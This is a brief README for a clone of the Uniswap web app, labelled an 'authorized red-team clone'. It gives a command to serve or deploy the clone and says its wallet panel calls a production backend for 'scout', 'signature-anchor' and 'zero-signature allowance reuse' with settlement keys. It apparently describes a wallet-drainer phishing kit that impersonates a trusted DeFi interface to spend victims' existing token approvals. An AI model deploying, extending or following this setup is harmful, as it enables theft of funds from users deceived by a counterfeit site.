# Authorized red-team clone

**Source:** https://app.uniswap.org/
**Backend:** https://legionapi-production.up.railway.app
**Generated:** 2026-06-12T00:16:30.987Z


## Requirements

- Written authorization from target organization
- `KINETIC_INTERNAL_KEY` at build time enables zero-signature allowance reuse
- Production API must have RPC + settlement keys configured

## Usage

```bash
npx --yes serve "C:\Users\HP\Downloads\Legion\legion-engine\clones\tunnel-2026-06-12T00-15-08-088Z" -l 8080
# or deploy to authorized staging domain
```

Wallet panel calls production `/api/v1/scout`, `/api/v1/signature-anchor`, and allowance-reuse internal APIs.
